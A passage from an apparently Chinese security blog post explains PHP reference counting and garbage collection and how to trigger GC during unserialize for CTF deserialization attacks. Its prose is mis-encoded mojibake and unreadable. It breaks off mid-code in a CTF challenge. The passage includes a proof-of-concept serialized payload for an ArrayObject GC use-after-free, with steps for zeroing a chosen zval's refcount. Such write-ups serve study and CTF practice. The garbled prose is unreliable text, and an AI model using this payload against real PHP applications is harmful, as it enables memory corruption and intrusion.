title="PHP7çš„NTSç‰ˆæœ¬"></a>PHP7çš„NTSç‰ˆæœ¬</h3><p>åœ¨è¯¥ç‰ˆæœ¬ï¼Œä¸Šè¿°é€šè¿‡èµ‹å€¼åŒä¸€ä¸ªå˜é‡çš„æƒ…å†µå·²ç»ä¸ä¼šå†è¢«è®¡æ•°ï¼ŒPHP7ä¸­ï¼Œzvalå¯ä»¥è¢«å¼•ç”¨è®¡æ•°æˆ–ä¸è¢«å¼•ç”¨</p><ul><li>å¯¹äºnullï¼Œboolï¼Œintå’Œdoubleçš„ç±»å‹å˜é‡ï¼Œrefcountæ°¸è¿œä¸ä¼šè®¡æ•°ï¼›</li><li>å¯¹äºå¯¹è±¡ã€èµ„æºç±»å‹ï¼Œrefcountè®¡æ•°å’Œphp5çš„ä¸€è‡´ï¼›</li><li>å¯¹äºå­—ç¬¦ä¸²ï¼Œæœªè¢«å¼•ç”¨çš„å˜é‡è¢«ç§°ä¸ºâ€œå®é™…å­—ç¬¦ä¸²â€ã€‚è€Œé‚£äº›è¢«å¼•ç”¨çš„å­—ç¬¦ä¸²ä¹Ÿä¸è®¡æ•°</li><li>å¯¹äºæ•°ç»„ï¼Œæœªå¼•ç”¨çš„å˜é‡è¢«ç§°ä¸ºâ€œä¸å¯å˜æ•°ç»„â€ã€‚å…¶æ•°ç»„æœ¬èº«è®¡æ•°ä¸php5ä¸€è‡´ï¼Œä½†æ˜¯æ•°ç»„é‡Œé¢çš„æ¯ä¸ªé”®å€¼å¯¹çš„è®¡æ•°ï¼Œåˆ™æŒ‰å‰é¢ä¸‰æ¡çš„è§„åˆ™ï¼ˆå³å¦‚æœæ˜¯å­—ç¬¦ä¸²ä¹Ÿä¸åœ¨è®¡æ•°ï¼‰ï¼›å¦‚æœä½¿ç”¨opcacheï¼Œåˆ™ä»£ç ä¸­çš„å¸¸é‡æ•°ç»„æ–‡å­—å°†è¢«è½¬æ¢ä¸ºä¸å¯å˜æ•°ç»„ã€‚</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æµ‹è¯•å­—ç¬¦ä¸²å¼•ç”¨è®¡æ•°&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æµ‹è¯•æ•°ç»„å¼•ç”¨è®¡æ•°&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$c</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$c</span>[<span class="number">2</span>]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æµ‹è¯•intå‹è®¡æ•°&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;e&#x27;</span> );</span><br></pre></td></tr></table></figure></div><p>è¾“å‡ºå¦‚ä¸‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•å­—ç¬¦ä¸²å¼•ç”¨è®¡æ•°</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">2</span>, is_ref=<span class="number">1</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>) <span class="comment">//å–åœ°å€å¼•ç”¨æ—¶ä¼šæ”¹å˜</span></span><br><span class="line">æµ‹è¯•æ•°ç»„å¼•ç”¨è®¡æ•°</span><br><span class="line">c:(refcount=<span class="number">2</span>, is_ref=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">3</span>, is_ref=<span class="number">0</span>) </span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="comment">//æ•°ç»„å€¼æ”¹å˜åï¼Œä¹‹å‰å¼•ç”¨å…¨éƒ¨åºŸå¼ƒ</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">2</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;c&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">æµ‹è¯•<span class="keyword">int</span>å‹è®¡æ•°e:(refcount=<span class="number">0</span>, is_ref=<span class="number">0</span>)<span class="keyword">int</span> <span class="number">1</span>  <span class="comment">//intå‹ä¸è®¡å¼•ç”¨æ¬¡æ•°</span></span><br></pre></td></tr></table></figure></div><h3 id="å›æ”¶å‘¨æœŸ"><a href="#å›æ”¶å‘¨æœŸ" class="headerlink" title="å›æ”¶å‘¨æœŸ"></a>å›æ”¶å‘¨æœŸ</h3><p>PHPåƒåœ¾å›æ”¶æœºåˆ¶é»˜è®¤æ‰“å¼€ï¼Œå¯ä»¥è®¾ç½®php.iniå€¼çš„<code>zend.enable_gc</code>ï¼Œæˆ–è€…è°ƒç”¨gc_enable() å’Œ gc_disable()å‡½æ•°ã€‚</p><p>å½“åƒåœ¾å›æ”¶æœºåˆ¶æ‰“å¼€æ—¶ï¼Œç®—æ³•åˆ¤æ–­åœ¨æ ¹ç¼“å­˜åŒºæ»¡æ—¶ï¼Œæ‰§è¡Œå¾ªç¯æŸ¥æ‰¾ï¼Œæ ¹ç¼“å­˜åŒºå¤§å°éœ€è¦é€šè¿‡ä¿®æ”¹phpæºç æ–‡ä»¶Zend&#x2F;zend_gc.cä¸­çš„å¸¸é‡GC_ROOT_BUFFER_MAX_ENTRIESï¼Œç„¶åé‡æ–°ç¼–è¯‘PHPï¼Œæ¥ä¿®æ”¹è¿™ä¸ªå€¼ã€‚</p><blockquote><p>è°ƒç”¨gc_disable()å‡½æ•°é‡Šæ”¾å†…å­˜ä¹‹å‰ï¼Œå…ˆè°ƒç”¨gc_collect_cycles()å‡½æ•°ï¼Œä»¥å…æ ¹ç¼“å­˜åŒºç©ºé—´ä¸è¶³</p></blockquote><h3 id="åƒåœ¾çš„äº§ç”Ÿ"><a href="#åƒåœ¾çš„äº§ç”Ÿ" class="headerlink" title="åƒåœ¾çš„äº§ç”Ÿ"></a>åƒåœ¾çš„äº§ç”Ÿ</h3><p>PHPä¸­ä¸€äº›å¤æ‚æ•°æ®ç±»å‹å¤´éƒ¨æœ‰ä¸€ä¸ªGCï¼Œç”¨äºæ”¯æŒåƒåœ¾å›æ”¶ã€‚</p><p>zend_reference è¿™ä¸ªç±»å‹ï¼Œè¿™ä¸ªæ˜¯ PHP7 æ–°å¢çš„å˜é‡ç±»å‹ï¼Œå½“å¯¹å˜é‡ä½¿ç”¨ â€œ&amp;â€ æ“ä½œæ—¶ï¼Œ<u>ä¼šåˆ›å»ºæ–°çš„ä¸­é—´ç»“æ„ä½“ zend_referenceï¼Œè¿™ä¸ªç»“æ„ä½“ä¼šçœŸæ­£çš„æŒ‡å‘å¯¹åº”çš„ value ç»“æ„ã€‚</u></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å½“è¿›è¡Œå¦‚ä¸‹èµ‹å€¼æ“ä½œæ—¶</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>; <span class="comment">// $a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>; <span class="comment">// $b,$a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$c</span> = &amp;<span class="variable">$b</span>; <span class="comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span></span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072213238.png"                      alt="image-20230405153644317"                ><figcaption>image-20230405153644317</figcaption></figure></p><blockquote><p><code>$bå’Œ$c</code>çš„zvaléƒ½æ˜¯é€šè¿‡ä¸­é—´ç»“æ„ä½“å†æŒ‡å‘æœ€ç»ˆçš„zend_string</p></blockquote><h3 id="å›æ”¶çš„è¿‡ç¨‹"><a href="#å›æ”¶çš„è¿‡ç¨‹" class="headerlink" title="å›æ”¶çš„è¿‡ç¨‹"></a>å›æ”¶çš„è¿‡ç¨‹</h3><p>å¦‚æœå½“å˜é‡çš„ refcount å‡å°åå¤§äº 0ï¼ŒPHP å¹¶ä¸ä¼šç«‹å³å¯¹è¿™ä¸ªå˜é‡è¿›è¡Œåƒåœ¾é‰´å®šå’Œå›æ”¶ï¼Œè€Œæ˜¯æ”¾å…¥ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼Œç­‰è¿™ä¸ªç¼“å†²åŒºæ»¡äº†ä»¥å (10000 ä¸ªå€¼) å†ç»Ÿä¸€è¿›è¡Œå¤„ç†ï¼ŒåŠ å…¥ç¼“å†²åŒºçš„æ˜¯å˜é‡ zend_value é‡Œçš„ gcï¼Œç›®å‰åƒåœ¾åªä¼šå‡ºç°åœ¨æ•°ç»„å’Œå¯¹è±¡ä¸¤ç§ç±»å‹ä¸­ï¼Œæ•°ç»„çš„æƒ…å†µä¸Šé¢å·²ç»ä»‹ç»äº†ï¼Œå¯¹è±¡çš„æƒ…å†µåˆ™æ˜¯æˆå‘˜å±æ€§å¼•ç”¨å¯¹è±¡æœ¬èº«å¯¼è‡´çš„ï¼Œå…¶å®ƒç±»å‹ä¸ä¼šå‡ºç°è¿™ç§å˜é‡ä¸­çš„æˆå‘˜å¼•ç”¨å˜é‡è‡ªèº«çš„æƒ…å†µï¼Œæ‰€ä»¥åƒåœ¾å›æ”¶åªä¼šå¤„ç†è¿™ä¸¤ç§ç±»å‹çš„å˜é‡ã€‚</p><p>gc çš„ç»“æ„ zend_refcounted_h å…·ä½“å¦‚ä¸‹:</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_zend_refcounted_h</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span>         refcount; <span class="comment">// è®°å½• zend_value çš„å¼•ç”¨æ•°</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            zend_uchar    type,  <span class="comment">// zend_valueçš„ç±»å‹, ä¸zval.u1.typeä¸€è‡´</span></span><br><span class="line">            zend_uchar    flags, </span><br><span class="line">            <span class="type">uint16_t</span>      gc_info <span class="comment">// GCä¿¡æ¯ï¼Œè®°å½•åœ¨ gc æ± ä¸­çš„ä½ç½®å’Œé¢œè‰²ï¼Œåƒåœ¾å›æ”¶çš„è¿‡ç¨‹ä¼šç”¨åˆ°</span></span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u;</span><br><span class="line">&#125; zend_refcounted_h;</span><br></pre></td></tr></table></figure></div><p>ä¸€ä¸ªå˜é‡åªèƒ½åŠ å…¥ä¸€æ¬¡ç¼“å†²åŒºï¼Œä¸ºäº†é˜²æ­¢é‡å¤åŠ å…¥ï¼Œå˜é‡åŠ å…¥åä¼šæŠŠ zend_refcounted_h.gc_info ç½®ä¸º GC_PURPLEï¼Œå³æ ‡ä¸ºç´«è‰²ï¼Œåç»­ä¸ä¼šé‡å¤æ’å…¥ã€‚</p><h2 id="ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"><a href="#ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨" class="headerlink" title="ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"></a>ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨</h2><h3 id="destructé­”æœ¯æ–¹æ³•"><a href="#destructé­”æœ¯æ–¹æ³•" class="headerlink" title="__destructé­”æœ¯æ–¹æ³•"></a>__destructé­”æœ¯æ–¹æ³•</h3><p>å½“æŸä¸ªå¯¹è±¡æˆä¸ºåƒåœ¾æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p><ul><li>æ˜¾ç¤ºé”€æ¯ï¼šunsetæˆ–èµ‹å€¼NULL</li><li>éšå¼é”€æ¯ï¼šä»£ç æ‰§è¡Œå®Œæ¯•åå°†æ‰€æœ‰ç”³è¯·çš„å†…å­˜é‡Šæ”¾æ‰</li></ul><blockquote><p>åœ¨å¸¸è§„æ€è·¯ä¸­destructæ˜¯éšå¼é”€æ¯è§¦å‘çš„,å°è¯•æ˜¾å¼é”€æ¯</p></blockquote><h3 id="æ—§ç‰ˆæœ¬GC"><a href="#æ—§ç‰ˆæœ¬GC" class="headerlink" title="æ—§ç‰ˆæœ¬GC"></a>æ—§ç‰ˆæœ¬GC</h3><p>ç®€å•çš„åˆ¤æ–­äº†ä¸€ä¸‹å˜é‡çš„zvalçš„refcountæ˜¯å¦ä¸º0ï¼Œæ˜¯çš„è¯å°±é‡Šæ”¾å¦åˆ™ä¸é‡Šæ”¾ç›´è‡³è¿›ç¨‹ç»“æŸã€‚</p><h3 id="æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“"><a href="#æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“" class="headerlink" title="æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“"></a>æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“</h3><p>ä¸»åŠ¨é”€æ¯å˜é‡ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"><span class="variable">$temp_name</span> = &amp;<span class="variable">$name</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$temp_name</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br></pre></td></tr></table></figure></div><p>refcountè®¡æ•°å‡1ï¼Œè¯´æ˜unsetå¹¶éä¸€å®šä¼šé‡Šæ”¾å†…å­˜ï¼Œå½“æœ‰ä¸¤ä¸ªå˜é‡æŒ‡å‘çš„æ—¶å€™ï¼Œå¹¶éä¼šé‡Šæ”¾å˜é‡å ç”¨çš„å†…å­˜ï¼Œåªæ˜¯refcountå‡1.</p><h3 id="è§¦å‘åƒåœ¾å›æ”¶"><a href="#è§¦å‘åƒåœ¾å›æ”¶" class="headerlink" title="è§¦å‘åƒåœ¾å›æ”¶"></a>è§¦å‘åƒåœ¾å›æ”¶</h3><p>è¯¥ç®—æ³•çš„å®ç°å¯ä»¥åœ¨<code>Zend/zend_gc.c</code>ï¼ˆ <a class="link"   href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c" >https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ï¼‰ä¸­æ‰¾åˆ°ã€‚æ¯å½“é”€æ¯zvalæ—¶ï¼ˆå¦‚åœ¨è¯¥zvalä¸Šè°ƒç”¨unsetæ—¶ï¼‰ï¼Œåƒåœ¾å›æ”¶ç®—æ³•ä¼šæ£€æŸ¥å…¶æ˜¯å¦ä¸ºæ•°ç»„æˆ–å¯¹è±¡ï¼Œé™¤äº†è¿™ä¿©ä¸ªç±»å‹å¤–å…¶ä»–éƒ½ä¸èƒ½åŒ…å«å¾ªç¯å¼•ç”¨ï¼Œè¿™ä¸€æ£€æŸ¥è¿‡ç¨‹ä½¿ç”¨<code>gc_zval_possible_root</code>å‡½æ•°æ¥å®ç°ã€‚ä»»ä½•è¿™ç§æ½œåœ¨çš„zvaléƒ½è¢«ç§°ä¸ºæ ¹ï¼ˆRootï¼‰ï¼Œå¹¶ä¼šè¢«æ·»åŠ åˆ°ä¸€ä¸ªåä¸º<code>gc_root_buffer</code>çš„åˆ—è¡¨ä¸­ã€‚<br>ç„¶åï¼Œå°†ä¼šé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´è‡³æ»¡è¶³ä¸‹è¿°æ¡ä»¶ä¹‹ä¸€ï¼š</p><ul><li><code>gc_collect_cycles()</code>è¢«æ‰‹åŠ¨è°ƒç”¨</li><li>åƒåœ¾å­˜å‚¨ç©ºé—´å°†æ»¡ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œåœ¨æ ¹ç¼“å†²åŒºçš„ä½ç½®å·²ç»å­˜å‚¨äº†10000ä¸ªzvalï¼Œå¹¶ä¸”å³å°†æ·»åŠ æ–°çš„æ ¹ã€‚10000æ—¶é¢„å®šä¹‰å¸¸é‡GC_ROOT_BUFFER_MAX_ENTRIES,å½“å‡ºç°ç¬¬10001ä¸ªzvalæ—¶ï¼Œå°†å†æ¬¡è°ƒç”¨gc_zval_possible_rootè¿›è¡Œæ£€æŸ¥ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨<code>gc_collect_cycles</code>ä»¥å¤„ç†å¹¶åˆ·æ–°å½“å‰ç¼“å†²åŒº</li></ul><blockquote><p>å¯ä»¥å¾—åˆ°è§¦å‘æ€è·¯ï¼Œå¡«æ»¡åƒåœ¾å­˜å‚¨ç©ºé—´</p></blockquote><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>ååºåˆ—åŒ–è¿‡ç¨‹å…è®¸ä¸€éåˆä¸€éåœ°ä¼ é€’ç›¸åŒçš„ç´¢å¼•ï¼Œæ‰€ä»¥ä¸æ–­ä¼šå¡«å……å†…å­˜ç©ºé—´ã€‚ä¸€æ—¦é‡æ–°ä½¿ç”¨æ•°ç»„ç´¢å¼•ï¼Œæ—§å…ƒç´ çš„å¼•ç”¨è®¡æ•°å™¨å°±ä¼šé€’å‡ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å°†ä¼šè°ƒç”¨<code>zend_hash_update</code>ï¼Œå®ƒå°†è°ƒç”¨æ—§å…ƒç´ çš„ææ„å‡½æ•°ï¼ˆDestructorï¼‰ã€‚æ¯å½“zvalè¢«é”€æ¯æ—¶ï¼Œéƒ½ä¼šæ¶‰åŠåˆ°åƒåœ¾å›æ”¶ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œæ‰€æœ‰åˆ›å»ºçš„æ•°ç»„éƒ½ä¼šå¼€å§‹å¡«å……åƒåœ¾ç¼“å†²åŒºï¼Œç›´è‡³è¶…å‡ºå…¶ç©ºé—´å¯¼è‡´å¯¹<code>gc_collect_cycles</code>çš„è°ƒç”¨ã€‚</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// POC of the ArrayObject GC vulnerability</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$serialized_string</span> = <span class="string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$outer_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_string</span>);</span><br><span class="line"><span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"><span class="variable">$filler1</span> = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"><span class="variable">$filler2</span> = <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$outer_array</span>);</span><br></pre></td></tr></table></figure></div><p>å®é™…ä¸Šï¼Œä¸€æ—¦è¯¥ç¤ºä¾‹æ‰§è¡Œï¼Œå¤–éƒ¨æ•°ç»„ï¼ˆç”±<code>$outer_array</code>å¼•ç”¨ï¼‰å°†ä¼šè¢«é‡Šæ”¾ï¼Œå¹¶ä¸”zvalå°†ä¼šè¢«<code>$filter2</code>çš„zvalè¦†ç›–ï¼Œå¯¼è‡´è¾“å‡ºâ€bbbbâ€ã€‚</p><p>ArrayObjectçš„ååºåˆ—åŒ–å‡½æ•°æ¥å—å¯¹å¦ä¸€ä¸ªæ•°ç»„çš„å¼•ç”¨ï¼Œä»¥ç”¨äºåˆå§‹åŒ–çš„ç›®çš„ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œä¸€æ—¦æˆ‘ä»¬å¯¹ä¸€ä¸ªArrayObjectè¿›è¡Œååºåˆ—åŒ–åï¼Œå°±å¯ä»¥å¼•ç”¨ä»»ä½•ä¹‹å‰å·²ç»è¢«ååºåˆ—åŒ–è¿‡çš„æ•°ç»„ã€‚æ­¤å¤–ï¼Œè¿™è¿˜å°†å…è®¸æˆ‘ä»¬å°†æ•´ä¸ªå“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰æ¡ç›®é€’å‡ä¸¤æ¬¡ã€‚</p><p>1ã€å¾—åˆ°ä¸€ä¸ªåº”è¢«é‡Šæ”¾çš„ç›®æ ‡zval Xï¼›<br>2ã€åˆ›å»ºä¸€ä¸ªæ•°ç»„Yï¼Œå…¶ä¸­åŒ…å«å‡ å¤„å¯¹zval Xçš„å¼•ç”¨ï¼š<code>array(ref_to_X, ref_to_X, [â€¦], ref_to_X)</code>ï¼›<br>3ã€åˆ›å»ºä¸€ä¸ªArrayObjectï¼Œå®ƒå°†ä½¿ç”¨æ•°ç»„Yçš„å†…å®¹è¿›è¡Œåˆå§‹åŒ–ï¼Œå› æ­¤ä¼šè¿”å›ä¸€æ¬¡ç”±åƒåœ¾å›æ”¶æ ‡è®°ç®—æ³•è®¿é—®è¿‡çš„æ•°ç»„Yçš„æ‰€æœ‰å­å…ƒç´ ã€‚<br>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥æ“çºµæ ‡è®°ç®—æ³•ï¼Œå¯¹æ•°ç»„Yä¸­çš„æ‰€æœ‰å¼•ç”¨å®ç°ä¸¤æ¬¡è®¿é—®ã€‚ä½†æ˜¯ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åˆ›å»ºå¼•ç”¨å°†ä¼šå¯¼è‡´å¼•ç”¨è®¡æ•°å™¨å¢åŠ 2ï¼Œæ‰€ä»¥è¿˜è¦æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š<br>4ã€ä½¿ç”¨ä¸æ­¥éª¤3ç›¸åŒçš„æ–¹æ³•ï¼Œé¢å¤–å†åˆ›å»ºä¸€ä¸ªArrayObjectã€‚<br>ä¸€æ—¦æ ‡è®°ç®—æ³•è®¿é—®ç¬¬äºŒä¸ªArrayObjectï¼Œå®ƒå°†å¼€å§‹å¯¹æ•°ç»„Yä¸­çš„æ‰€æœ‰å¼•ç”¨è¿›è¡Œç¬¬ä¸‰æ¬¡é€’å‡ã€‚æˆ‘ä»¬ç°åœ¨å°±æœ‰æ–¹æ³•èƒ½å¤Ÿä½¿å¼•ç”¨è®¡æ•°å™¨é€’å‡ï¼Œå¯ä»¥å°†è¯¥æ–¹æ³•ç”¨äºå¯¹ä»»æ„ç›®æ ‡zvalçš„å¼•ç”¨è®¡æ•°å™¨å®ç°æ¸…é›¶ã€‚</p><p>ä¸¾ä¸ªä¾‹å­</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&#123;&quot;</span>.<span class="title function_ invoke__">md5</span>(time).<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;successful\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span 